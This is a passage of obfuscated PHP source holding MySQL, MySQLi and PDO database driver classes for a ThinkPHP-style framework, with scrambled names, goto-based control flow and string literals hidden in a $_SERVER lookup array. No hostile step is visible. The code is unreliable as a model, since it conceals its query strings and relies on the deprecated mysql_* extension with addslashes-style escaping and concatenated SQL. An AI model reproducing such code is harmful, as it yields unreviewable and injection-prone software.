header($a„¢ö³À‘); } goto D¯‚­©æá‘; aŸ‹·¦¨Ì¢: } } goto E¨¬“Ù½º£; Fä‹†İ Üó: class DbMysql extends Db { public function __construct($CéÜÏÎ¿æ = '') { $c»ìÎ¨šÌ =& $_SERVER[Å¸ş]; if (!extension_loaded($c»ìÎ¨šÌ[730])) { think_exception(think_lang($c»ìÎ¨šÌ[10]) . $c»ìÎ¨šÌ[795]); } if (!empty($CéÜÏÎ¿æ)) { $this->config = $CéÜÏÎ¿æ; if (empty($this->config[$c»ìÎ¨šÌ[13]])) { $this->config[$c»ìÎ¨šÌ[13]] = $c»ìÎ¨šÌ[33]; } } } public function connect($AŠ¾°œ«‘ = '', $b‡ñŞğ›Û© = 0, $c¾ÀßÖÕñ = false) { $b†ñ±Š¹Áê =& $_SERVER[Å¸ş]; if (!isset($this->linkID[$b‡ñŞğ›Û©])) { goto a¡½İóšº‡; c´ñËÚ Öí: if (1 != think_config($b†ñ±Š¹Áê[18])) { unset($this->config); } goto f£ÌÅáğµ; dóããÇÙÁ: if ($D¾ÄÔ¹Šê‡) { $this->linkID[$b‡ñŞğ›Û©] = mysql_pconnect($bæØ’‰ëÜˆ, $AŠ¾°œ«‘[$b†ñ±Š¹Áê[798]], $AŠ¾°œ«‘[$b†ñ±Š¹Áê[799]], 131072); } else { $this->linkID[$b‡ñŞğ›Û©] = mysql_connect($bæØ’‰ëÜˆ, $AŠ¾°œ«‘[$b†ñ±Š¹Áê[798]], $AŠ¾°œ«‘[$b†ñ±Š¹Áê[799]], !0, 131072); } if (!$this->linkID[$b‡ñŞğ›Û©] || !empty($AŠ¾°œ«‘[$b†ñ±Š¹Áê[17]]) && !mysql_select_db($AŠ¾°œ«‘[$b†ñ±Š¹Áê[17]], $this->linkID[$b‡ñŞğ›Û©])) { think_exception(mysql_error()); } $cÖ”ƒÇ›ŠÆ = mysql_get_server_info($this->linkID[$b‡ñŞğ›Û©]); goto E©Î›íãŸÜ; a¡½İóšº‡: if (empty($AŠ¾°œ«‘)) { $AŠ¾°œ«‘ = $this->config; } $bæØ’‰ëÜˆ = $AŠ¾°œ«‘[$b†ñ±Š¹Áê[796]] . ($AŠ¾°œ«‘[$b†ñ±Š¹Áê[797]] ? "\72{$AŠ¾°œ«‘[$b†ñ±Š¹Áê[797]]}" : $b†ñ±Š¹Áê[33]); $D¾ÄÔ¹Šê‡ = !empty($AŠ¾°œ«‘[$b†ñ±Š¹Áê[13]][$b†ñ±Š¹Áê[14]]) ? $AŠ¾°œ«‘[$b†ñ±Š¹Áê[13]][$b†ñ±Š¹Áê[14]] : $this->pconnect; goto dóããÇÙÁ; E©Î›íãŸÜ: mysql_query($b†ñ±Š¹Áê[800] . think_config($b†ñ±Š¹Áê[801]) . $b†ñ±Š¹Áê[55], $this->linkID[$b‡ñŞğ›Û©]); if ($cÖ”ƒÇ›ŠÆ > $b†ñ±Š¹Áê[802]) { mysql_query($b†ñ±Š¹Áê[803], $this->linkID[$b‡ñŞğ›Û©]); } $this->connected = !0; goto c´ñËÚ Öí; f£ÌÅáğµ: } return $this->linkID[$b‡ñŞğ›Û©]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($f–°ÃˆÁ‰) { goto a±¼º›¸œö; a±¼º›¸œö: $F‘´ÉÏÎ×É =& $_SERVER[Å¸ş]; if (0 === stripos($f–°ÃˆÁ‰, $F‘´ÉÏÎ×É[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto a’‡¯Ó÷Ø­; D‚²¤™à¥: think_action_status($F‘´ÉÏÎ×É[19], 1); think_status($F‘´ÉÏÎ×É[20]); $this->queryID = mysql_query($f–°ÃˆÁ‰, $this->_linkID); goto BÂğÖÅ‰’; a’‡¯Ó÷Ø­: if (!$this->_linkID) { return !1; } $this->queryStr = $f–°ÃˆÁ‰; if ($this->queryID) { $this->free(); } goto D‚²¤™à¥; BÂğÖÅ‰’: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bˆóÏìæµš; bˆóÏìæµš: } public function execute($dÉ›·Í‚ñ) { goto Aöò›¢³ôÃ; C±™Ÿ‹Ü‰ö: if (!1 === $B–¥êºÒç—) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fĞƒ´áÁ; B©Îª±ªõ: think_status($A´„øÎÓË‰[20]); $B–¥êºÒç— = mysql_query($dÉ›·Í‚ñ, $this->_linkID); $this->debug(); goto C±™Ÿ‹Ü‰ö; cÌ±Áñ±: $this->queryStr = $dÉ›·Í‚ñ; if ($this->queryID) { $this->free(); } think_action_status($A´„øÎÓË‰[21], 1); goto B©Îª±ªõ; Aöò›¢³ôÃ: $A´„øÎÓË‰ =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÌ±Áñ±; fĞƒ´áÁ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Å¸ş][804], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FÔˆèë”Ğ‘ = mysql_query($_SERVER[Å¸ş][805], $this->_linkID); $this->transTimes = 0; if (!$FÔˆèë”Ğ‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f­ÜêÙÄ¸ = mysql_query($_SERVER[Å¸ş][806], $this->_linkID); $this->transTimes = 0; if (!$f­ÜêÙÄ¸) { $this->error(); return !1; } } return !0; } private function getAll() { $eî•õ“ËñÜ = array(); if ($this->numRows > 0) { while ($bŒ¯Œ«Çˆ = mysql_fetch_assoc($this->queryID)) { $eî•õ“ËñÜ[] = $bŒ¯Œ«Çˆ; } mysql_data_seek($this->queryID, 0); } return $eî•õ“ËñÜ; } public function getFields($aÈ½¿˜Œ’§) { $E¹Š«¹‹Ó =& $_SERVER[Å¸ş]; $A‹â÷´‡õƒ = $this->query($E¹Š«¹‹Ó[807] . $this->parseKey($aÈ½¿˜Œ’§)); $FÜÌšŒÜ”§ = array(); if ($A‹â÷´‡õƒ) { foreach ($A‹â÷´‡õƒ as $f‰î¬ˆ™–Ã => $Bçº“®öŠ‹) { $FÜÌšŒÜ”§[$Bçº“®öŠ‹[$E¹Š«¹‹Ó[27]]] = array($E¹Š«¹‹Ó[28] => $Bçº“®öŠ‹[$E¹Š«¹‹Ó[27]], $E¹Š«¹‹Ó[29] => $Bçº“®öŠ‹[$E¹Š«¹‹Ó[30]], $E¹Š«¹‹Ó[31] => (bool) (strtoupper($Bçº“®öŠ‹[$E¹Š«¹‹Ó[32]]) === $E¹Š«¹‹Ó[808]), $E¹Š«¹‹Ó[34] => $Bçº“®öŠ‹[$E¹Š«¹‹Ó[35]], $E¹Š«¹‹Ó[36] => strtolower($Bçº“®öŠ‹[$E¹Š«¹‹Ó[37]]) == $E¹Š«¹‹Ó[38], $E¹Š«¹‹Ó[39] => strtolower($Bçº“®öŠ‹[$E¹Š«¹‹Ó[40]]) == $E¹Š«¹‹Ó[41]); } } return $FÜÌšŒÜ”§; } public function getTables($C²Ô£ì¶Š = '') { $BÍ–·Ú´Ë½ =& $_SERVER[Å¸ş]; if (!empty($C²Ô£ì¶Š)) { $d¨œ¬„˜èâ = $BÍ–·Ú´Ë½[809] . $C²Ô£ì¶Š; } else { $d¨œ¬„˜èâ = $BÍ–·Ú´Ë½[810]; } $B›ÒáíÍç = $this->query($d¨œ¬„˜èâ); $bÜó¢äİä´ = array(); foreach ($B›ÒáíÍç as $dŞ‡”Ä£î => $cÑƒ£–‡†Ä) { $bÜó¢äİä´[$dŞ‡”Ä£î] = current($cÑƒ£–‡†Ä); } return $bÜó¢äİä´; } public function replace($Cë×ïŞÛº, $B¾ÇÕÜ¯¤ƒ = array()) { $aŞ·Ó±” =& $_SERVER[Å¸ş]; foreach ($Cë×ïŞÛº as $b«Íªö‰’ğ => $f„Õó‚ Ï‰) { $e°¬Æƒ¾Ã = $this->parseValue($f„Õó‚ Ï‰); if (is_scalar($e°¬Æƒ¾Ã)) { $e…Ñß¡ÎÜ’[] = $e°¬Æƒ¾Ã; $EŞÂù’¨Ä[] = $this->parseKey($b«Íªö‰’ğ); } } $c„óÁµŞ¯Ì = $aŞ·Ó±”[811] . $this->parseTable($B¾ÇÕÜ¯¤ƒ[$aŞ·Ó±”[267]]) . $aŞ·Ó±”[812] . implode($aŞ·Ó±”[47], $EŞÂù’¨Ä) . $aŞ·Ó±”[813] . implode($aŞ·Ó±”[47], $e…Ñß¡ÎÜ’) . $aŞ·Ó±”[814]; return $this->execute($c„óÁµŞ¯Ì); } public function insertAll($b¡õô£èÃ°, $D­ÚØ“Ñ = array(), $DÀ¾ÎÛÙ°¬ = false) { goto Bµç¶Ê†Á; Bµç¶Ê†Á: $Böİ·—ºä‚ =& $_SERVER[Å¸ş]; if (!is_array($b¡õô£èÃ°[0])) { return !1; } $F¢ôÆëÑ¯Ø = array_keys($b¡õô£èÃ°[0]); goto aêÊé¤Îø‚; Eê‹…Ö¿Ôì: $EÖ¬­ßÍƒ = ($DÀ¾ÎÛÙ°¬ ? $Böİ·—ºä‚[816] : $Böİ·—ºä‚[817]) . $Böİ·—ºä‚[818] . $this->parseTable($D­ÚØ“Ñ[$Böİ·—ºä‚[267]]) . $Böİ·—ºä‚[812] . implode($Böİ·—ºä‚[47], $F¢ôÆëÑ¯Ø) . $Böİ·—ºä‚[819] . implode($Böİ·—ºä‚[47], $a‰ëã¬ ›Ø); return $this->execute($EÖ¬­ßÍƒ); goto bø›å; aêÊé¤Îø‚: $a‰ëã¬ ›Ø = array(); foreach ($b¡õô£èÃ° as $F®Êµ–Í†İ) { $AíªíëğŞÎ = array(); foreach ($F®Êµ–Í†İ as $CÊÒÕ†ŒöÌ => $eèÂö¶ÙØ) { $eèÂö¶ÙØ = $this->parseValue($eèÂö¶ÙØ); if (is_scalar($eèÂö¶ÙØ)) { $AíªíëğŞÎ[] = $eèÂö¶ÙØ; } } $a‰ëã¬ ›Ø[] = $Böİ·—ºä‚[248] . implode($Böİ·—ºä‚[47], $AíªíëğŞÎ) . $Böİ·—ºä‚[814]; } array_walk($F¢ôÆëÑ¯Ø, array($this, $Böİ·—ºä‚[815])); goto Eê‹…Ö¿Ôì; bø›å: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $cè¾Œ‘¢¼Ï =& $_SERVER[Å¸ş]; $this->error = mysql_errno() . $cè¾Œ‘¢¼Ï[4] . mysql_error($this->_linkID); if ($cè¾Œ‘¢¼Ï[33] != $this->queryStr) { $this->error .= LNG($cè¾Œ‘¢¼Ï[45]) . $this->queryStr; } think_trace($this->error, $cè¾Œ‘¢¼Ï[33], $cè¾Œ‘¢¼Ï[46]); return $this->error; } public function escapeString($aŞãÖñ³ôÕ) { if ($this->_linkID) { return mysql_real_escape_string($aŞãÖñ³ôÕ, $this->_linkID); } else { return mysql_escape_string($aŞãÖñ³ôÕ); } } public function parseKey(&$bï‘¡Í±‘, $bÑ²Æ…æ†ã = true) { $EèØï÷”› =& $_SERVER[Å¸ş]; if ($bÑ²Æ…æ†ã) { $bï‘¡Í±‘ = $this->parseKeyCheck($bï‘¡Í±‘); } if ($bï‘¡Í±‘ != $EèØï÷”›[176] && !preg_match($EèØï÷”›[820], $bï‘¡Í±‘)) { $bï‘¡Í±‘ = $EèØï÷”›[821] . trim($bï‘¡Í±‘, $EèØï÷”›[821]) . $EèØï÷”›[821]; } return $bï‘¡Í±‘; } } class DbMysqli extends Db { public function __construct($c°õÍçƒÚ… = '') { $DÔÁÓ©§ =& $_SERVER[Å¸ş]; if (!extension_loaded($DÔÁÓ©§[729])) { think_exception(think_lang($DÔÁÓ©§[10]) . $DÔÁÓ©§[822]); } if (!empty($c°õÍçƒÚ…)) { $this->config = $c°õÍçƒÚ…; if (empty($this->config[$DÔÁÓ©§[13]])) { $this->config[$DÔÁÓ©§[13]] = $DÔÁÓ©§[33]; } } } public function connect($d„«Š‹‚š = '', $cß—Á‘Ãê® = 0) { $B¥¼òÀ»¯İ =& $_SERVER[Å¸ş]; if (!isset($this->linkID[$cß—Á‘Ãê®])) { goto DİÇÁìí‚ó; aÆò« À: $this->connected = !0; if (1 != think_config($B¥¼òÀ»¯İ[18])) { unset($this->config); } goto D•¾çïë¶à; DİÇÁìí‚ó: if (empty($d„«Š‹‚š)) { $d„«Š‹‚š = $this->config; } $this->linkID[$cß—Á‘Ãê®] = new mysqli($d„«Š‹‚š[$B¥¼òÀ»¯İ[796]], $d„«Š‹‚š[$B¥¼òÀ»¯İ[798]], $d„«Š‹‚š[$B¥¼òÀ»¯İ[799]], $d„«Š‹‚š[$B¥¼òÀ»¯İ[17]], $d„«Š‹‚š[$B¥¼òÀ»¯İ[797]] ? intval($d„«Š‹‚š[$B¥¼òÀ»¯İ[797]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Fî‚óØå¤ˆ; Fî‚óØå¤ˆ: $fí™¬  = $this->linkID[$cß—Á‘Ãê®]->server_version; $this->linkID[$cß—Á‘Ãê®]->query($B¥¼òÀ»¯İ[800] . think_config($B¥¼òÀ»¯İ[801]) . $B¥¼òÀ»¯İ[55]); if ($fí™¬  > $B¥¼òÀ»¯İ[802]) { $this->linkID[$cß—Á‘Ãê®]->query($B¥¼òÀ»¯İ[803]); } goto aÆò« À; D•¾çïë¶à: } return $this->linkID[$cß—Á‘Ãê®]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aÒ¼ëÁù) { goto d° é‡¦Ÿè; d° é‡¦Ÿè: $CŒãâÃÎæ¶ =& $_SERVER[Å¸ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fñ‹ù°ÔÇï; b¹ÁÃñ¨æ£: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto C¯—ÜŸµ; Fñ‹ù°ÔÇï: $this->queryStr = $aÒ¼ëÁù; if ($this->queryID) { $this->free(); } think_action_status($CŒãâÃÎæ¶[19], 1); goto BŸœâ„õ³; BŸœâ„õ³: think_status($CŒãâÃÎæ¶[20]); $this->queryID = $this->_linkID->query($aÒ¼ëÁù); if ($this->_linkID->more_results()) { while (($c¿º„†¯­Ï = $this->_linkID->next_result()) != NULL) { $c¿º„†¯­Ï->free_result(); } } goto b¹ÁÃñ¨æ£; C¯—ÜŸµ: } public function execute($b»¢ƒÓà™ ) { goto cöº®“ñ¼‘; eÖÌˆ‘¶Àé: if (!1 === $b¶ğäº¡Á) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto c‹ó´ÔÖÎ‡; cöº®“ñ¼‘: $C³Üç—Š·® =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A¯ùÃ·ÔÑ; fÕ†«ĞÓ±: think_status($C³Üç—Š·®[20]); $b¶ğäº¡Á = $this->_linkID->query($b»¢ƒÓà™ ); $this->debug(); goto eÖÌˆ‘¶Àé; A¯ùÃ·ÔÑ: $this->queryStr = $b»¢ƒÓà™ ; if ($this->queryID) { $this->free(); } think_action_status($C³Üç—Š·®[21], 1); goto fÕ†«ĞÓ±; c‹ó´ÔÖÎ‡: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f°¡õÚçæ¬ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f°¡õÚçæ¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D½Ò¸İÇ‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D½Ò¸İÇ‡) { $this->error(); return !1; } } return !0; } private function getAll() { $BØç˜›å° = array(); if ($this->numRows > 0) { for ($f‰†æŠåë = 0; $f‰†æŠåë < $this->numRows; $f‰†æŠåë++) { $BØç˜›å°[$f‰†æŠåë] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $BØç˜›å°; } public function getFields($dàæÔ©‰§ª) { $b½Ø¢ë¥°À =& $_SERVER[Å¸ş]; $dçÜ«÷•â = $this->query($b½Ø¢ë¥°À[807] . $this->parseKey($dàæÔ©‰§ª)); $Cãá¶‚ã›ƒ = array(); if ($dçÜ«÷•â) { foreach ($dçÜ«÷•â as $bÜ„Á‹‹â• => $dåºÒ¾Š‘É) { $Cãá¶‚ã›ƒ[$dåºÒ¾Š‘É[$b½Ø¢ë¥°À[27]]] = array($b½Ø¢ë¥°À[28] => $dåºÒ¾Š‘É[$b½Ø¢ë¥°À[27]], $b½Ø¢ë¥°À[29] => $dåºÒ¾Š‘É[$b½Ø¢ë¥°À[30]], $b½Ø¢ë¥°À[31] => (bool) ($dåºÒ¾Š‘É[$b½Ø¢ë¥°À[32]] === $b½Ø¢ë¥°À[33]), $b½Ø¢ë¥°À[34] => $dåºÒ¾Š‘É[$b½Ø¢ë¥°À[35]], $b½Ø¢ë¥°À[36] => strtolower($dåºÒ¾Š‘É[$b½Ø¢ë¥°À[37]]) == $b½Ø¢ë¥°À[38], $b½Ø¢ë¥°À[39] => strtolower($dåºÒ¾Š‘É[$b½Ø¢ë¥°À[40]]) == $b½Ø¢ë¥°À[41]); } } return $Cãá¶‚ã›ƒ; } public function getTables($EäÀÇô¤ì = '') { $FÚÏ»ƒÜ„ =& $_SERVER[Å¸ş]; $a“¼‰Ş‚“Ò = !empty($EäÀÇô¤ì) ? $FÚÏ»ƒÜ„[809] . $EäÀÇô¤ì : $FÚÏ»ƒÜ„[810]; $dƒš…ªÉÚ° = $this->query($a“¼‰Ş‚“Ò); $cÍì»¦»œŞ = array(); if ($dƒš…ªÉÚ°) { foreach ($dƒš…ªÉÚ° as $E×ŒÄ³±ê => $Eæ°†Í·¶­) { $cÍì»¦»œŞ[$E×ŒÄ³±ê] = current($Eæ°†Í·¶­); } } return $cÍì»¦»œŞ; } public function replace($dÁÈÙÇ‡çç, $b…§Ñ”¿£Š = array()) { $fò½Æ£µ×ß =& $_SERVER[Å¸ş]; foreach ($dÁÈÙÇ‡çç as $EÑâšİ¶° => $Fíåîì¢Ã) { $F·æ¡­·µ = $this->parseValue($Fíåîì¢Ã); if (is_scalar($F·æ¡­·µ)) { $B¢‡¦Õòóõ[] = $F·æ¡­·µ; $bçï¸ÀÃÓÛ[] = $this->parseKey($EÑâšİ¶°); } } $C‚ØÖÛò› = $fò½Æ£µ×ß[811] . $this->parseTable($b…§Ñ”¿£Š[$fò½Æ£µ×ß[267]]) . $fò½Æ£µ×ß[812] . implode($fò½Æ£µ×ß[47], $bçï¸ÀÃÓÛ) . $fò½Æ£µ×ß[813] . implode($fò½Æ£µ×ß[47], $B¢‡¦Õòóõ) . $fò½Æ£µ×ß[814]; return $this->execute($C‚ØÖÛò›); } public function insertAll($Eõñîöä©Ò, $bÍË¾ÀĞƒ = array(), $aÕÖ¬ˆå©ê = false) { goto fğ…„§¥ ¦; CÎÙ ÆĞíâ: $B¥Ú§çá¶” = ($aÕÖ¬ˆå©ê ? $D¹ËÛÓ·š¬[816] : $D¹ËÛÓ·š¬[817]) . $D¹ËÛÓ·š¬[818] . $this->parseTable($bÍË¾ÀĞƒ[$D¹ËÛÓ·š¬[267]]) . $D¹ËÛÓ·š¬[812] . implode($D¹ËÛÓ·š¬[47], $aÂ»¤§¶ïÌ) . $D¹ËÛÓ·š¬[819] . implode($D¹ËÛÓ·š¬[47], $E‘Ñóƒ¯³ï); return $this->execute($B¥Ú§çá¶”); goto AÀ Ú ²Äï; fğ…„§¥ ¦: $D¹ËÛÓ·š¬ =& $_SERVER[Å¸ş]; if (!is_array($Eõñîöä©Ò[0])) { return !1; } $aÂ»¤§¶ïÌ = array_keys($Eõñîöä©Ò[0]); goto f‰Œñ—Ÿ²; f‰Œñ—Ÿ²: $E‘Ñóƒ¯³ï = array(); foreach ($Eõñîöä©Ò as $Eô¦ÊáçÊ) { $A‚ŞÑ„‹÷º = array(); foreach ($Eô¦ÊáçÊ as $C”¢İñ„Å => $cß’£³›•) { $cß’£³›• = $this->parseValue($cß’£³›•); if (is_scalar($cß’£³›•)) { $A‚ŞÑ„‹÷º[] = $cß’£³›•; } } $E‘Ñóƒ¯³ï[] = $D¹ËÛÓ·š¬[248] . implode($D¹ËÛÓ·š¬[47], $A‚ŞÑ„‹÷º) . $D¹ËÛÓ·š¬[814]; } array_walk($aÂ»¤§¶ïÌ, array($this, $D¹ËÛÓ·š¬[815])); goto CÎÙ ÆĞíâ; AÀ Ú ²Äï: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BÓĞ°õäĞ =& $_SERVER[Å¸ş]; $this->error = $this->_linkID->errno . $BÓĞ°õäĞ[4] . $this->_linkID->error; if ($BÓĞ°õäĞ[33] != $this->queryStr) { $this->error .= LNG($BÓĞ°õäĞ[45]) . $this->queryStr; } think_trace($this->error, $BÓĞ°õäĞ[33], $BÓĞ°õäĞ[46]); return $this->error; } public function escapeString($dğÊÎ’Ê²›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($dğÊÎ’Ê²›); } else { return addslashes($dğÊÎ’Ê²›); } } public function parseKey(&$aŒé˜ò™”, $d ‡ƒêµ…Ò = true) { $Eó²æİ‰”• =& $_SERVER[Å¸ş]; if ($d ‡ƒêµ…Ò) { $aŒé˜ò™” = $this->parseKeyCheck($aŒé˜ò™”); } if ($aŒé˜ò™” != $Eó²æİ‰”•[176] && !preg_match($Eó²æİ‰”•[820], $aŒé˜ò™”)) { $aŒé˜ò™” = $Eó²æİ‰”•[821] . trim($aŒé˜ò™”, $Eó²æİ‰”•[821]) . $Eó²æİ‰”•[821]; } return $aŒé˜ò™”; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($bÃ¨³¤¦Í = '') { $B¦ìíÒ„Œ® =& $_SERVER[Å¸ş]; if (!class_exists($B¦ìíÒ„Œ®[823])) { think_exception(think_lang($B¦ìíÒ„Œ®[10]) . $B¦ìíÒ„Œ®[824]); } if (!empty($bÃ¨³¤¦Í)) { $this->config = $bÃ¨³¤¦Í; if (empty($this->config[$B¦ìíÒ„Œ®[13]])) { $this->config[$B¦ìíÒ„Œ®[13]] = array(); } } } public function connect($fæ™¨ÊŸ = '', $c¤ğœåóÄÑ = 0) { $B®×à–Ú×ó =& $_SERVER[Å¸ş]; if (!isset($this->linkID[$c¤ğœåóÄÑ])) { goto eÎŒ×¼´½; FßùÜ ö‘: try { $this->linkID[$c¤ğœåóÄÑ]->exec($B®×à–Ú×ó[834] . think_config($B®×à–Ú×ó[801])); } catch (Exception $f×¶…“Œ›Ê) { } $this->connected = !0; if (1 != think_config($B®×à–Ú×ó[18])) { unset($this->config); } goto c–‰½ÊÎ…±; bÈæŠ´…Ä›: $this->dbType = $this->_getDsnType($fæ™¨ÊŸ[$B®×à–Ú×ó[825]]); if (in_array($this->dbType, array($B®×à–Ú×ó[826], $B®×à–Ú×ó[827], $B®×à–Ú×ó[828], $B®×à–Ú×ó[829]))) { think_exception($B®×à–Ú×ó[830] . $this->dbType . $B®×à–Ú×ó[831] . $this->dbType . $B®×à–Ú×ó[832]); } if (!$this->linkID[$c¤ğœåóÄÑ]) { think_exception($B®×à–Ú×ó[833]); } goto FßùÜ ö‘; eÎŒ×¼´½: if (empty($fæ™¨ÊŸ)) { $fæ™¨ÊŸ = $this->config; } if ($this->pconnect) { $fæ™¨ÊŸ[$B®×à–Ú×ó[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$c¤ğœåóÄÑ] = new PDO($fæ™¨ÊŸ[$B®×à–Ú×ó[825]], $fæ™¨ÊŸ[$B®×à–Ú×ó[798]], $fæ™¨ÊŸ[$B®×à–Ú×ó[799]], $fæ™¨ÊŸ[$B®×à–Ú×ó[13]]); } catch (PDOException $f×¶…“Œ›Ê) { think_exception($f×¶…“Œ›Ê->getMessage()); } goto bÈæŠ´…Ä›; c–‰½ÊÎ…±: } return $this->linkID[$c¤ğœåóÄÑ]; } public function free() { $this->PDOStatement = null; } public function query($båÅùª¾õê, $FØÁ‘Ù™‡ = array()) { goto e‚ªªñì; dá…«Š¢õ: $this->queryStr = $båÅùª¾õê; if (!empty($FØÁ‘Ù™‡)) { $this->queryStr .= $CóÓáŠÔ…î[835] . print_r($FØÁ‘Ù™‡, !0) . $CóÓáŠÔ…î[836]; } if (!empty($this->PDOStatement)) { $this->free(); } goto A‡øÓ²‡¨ø; EéóëÆ«‘: if (!1 === $bÚğ‡Œ“) { $this->error(); return !1; } else { return $this->getAll(); } goto dòŸÜ¯ÁŞ½; A‡øÓ²‡¨ø: think_action_status($CóÓáŠÔ…î[19], 1); think_status($CóÓáŠÔ…î[20]); $this->PDOStatement = $this->_linkID->prepare($båÅùª¾õê); goto EÎš‚ÉîËŒ; e‚ªªñì: $CóÓáŠÔ…î =& $_SERVER[Å¸ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dá…«Š¢õ; EÎš‚ÉîËŒ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÚğ‡Œ“ = $this->PDOStatement->execute($FØÁ‘Ù™‡); $this->debug(); goto EéóëÆ«‘; dòŸÜ¯ÁŞ½: } public function execute($E¥Ò¤ÃŒô÷, $e¹„«½½š¤ = array()) { goto dÂéŞ´©ƒ; dÂéŞ´©ƒ: $e•ˆÆ°ÅÆ =& $_SERVER[Å¸ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D¼Ëš‘â¼; EÅ§ÔáíŒæ: think_status($e•ˆÆ°ÅÆ[20]); $this->PDOStatement = $this->_linkID->prepare($E¥Ò¤ÃŒô÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Eòèá—ÉÑ°; Eòèá—ÉÑ°: $b˜ôÖÍ‰ÂŠ = $this->PDOStatement->execute($e¹„«½½š¤); $this->debug(); if (!1 === $b˜ôÖÍ‰ÂŠ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($C˜Íæ‚²×Í || preg_match($e•ˆÆ°ÅÆ[841], $E¥Ò¤ÃŒô÷)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto E¿İáÍ·ãÑ; DÃª²µåÒ: if ($this->dbType == $e•ˆÆ°ÅÆ[829]) { if (preg_match($e•ˆÆ°ÅÆ[837], $this->queryStr, $CÎˆ†á¬ÌÓ)) { $this->table = think_config($e•ˆÆ°ÅÆ[838]) . str_ireplace(think_config($e•ˆÆ°ÅÆ[839]), $e•ˆÆ°ÅÆ[361], $CÎˆ†á¬ÌÓ[2]); $C˜Íæ‚²×Í = (bool) $this->query($e•ˆÆ°ÅÆ[840] . strtoupper($this->table) . $e•ˆÆ°ÅÆ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($e•ˆÆ°ÅÆ[21], 1); goto EÅ§ÔáíŒæ; D¼Ëš‘â¼: $this->queryStr = $E¥Ò¤ÃŒô÷; if (!empty($e¹„«½½š¤)) { $this->queryStr .= $e•ˆÆ°ÅÆ[835] . print_r($e¹„«½½š¤, !0) . $e•ˆÆ°ÅÆ[836]; } $C˜Íæ‚²×Í = !1; goto DÃª²µåÒ; E¿İáÍ·ãÑ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c’öÇ‡µó = $this->_linkID->commit(); $this->transTimes = 0; if (!$c’öÇ‡µó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dæÃÙ¡ÌÈ­ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dæÃÙ¡ÌÈ­) { $this->error(); return !1; } } return !0; } private function getAll() { $Aã„“ŞØ¦ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Aã„“ŞØ¦); return $Aã„“ŞØ¦; } public function getFields($A˜ã­¥Úç¦) { goto FÆ¯ê×ŸŸÏ; Dªš×†Ñç: $B¢ì‹Íƒ¸ = $this->query($f’°¶•¤Á); $a„ôçÆŸ¬¼ = array(); if ($B¢ì‹Íƒ¸) { foreach ($B¢ì‹Íƒ¸ as $CøÙğ¦´“ğ => $C·œ¤‘àñ­) { $C·œ¤‘àñ­ = array_change_key_case($C·œ¤‘àñ­); $C·œ¤‘àñ­[$c¬Â›•[28]] = isset($C·œ¤‘àñ­[$c¬Â›•[28]]) ? $C·œ¤‘àñ­[$c¬Â›•[28]] : $c¬Â›•[361]; $C·œ¤‘àñ­[$c¬Â›•[29]] = isset($C·œ¤‘àñ­[$c¬Â›•[29]]) ? $C·œ¤‘àñ­[$c¬Â›•[29]] : $c¬Â›•[361]; $C³î¦óÒÁŞ = isset($C·œ¤‘àñ­[$c¬Â›•[261]]) ? $C·œ¤‘àñ­[$c¬Â›•[261]] : $C·œ¤‘àñ­[$c¬Â›•[28]]; $a„ôçÆŸ¬¼[$C³î¦óÒÁŞ] = array($c¬Â›•[28] => $C³î¦óÒÁŞ, $c¬Â›•[29] => $C·œ¤‘àñ­[$c¬Â›•[29]], $c¬Â›•[31] => (bool) (isset($C·œ¤‘àñ­[$c¬Â›•[99]]) && $C·œ¤‘àñ­[$c¬Â›•[99]] === $c¬Â›•[33] || isset($C·œ¤‘àñ­[$c¬Â›•[31]]) && $C·œ¤‘àñ­[$c¬Â›•[31]] === 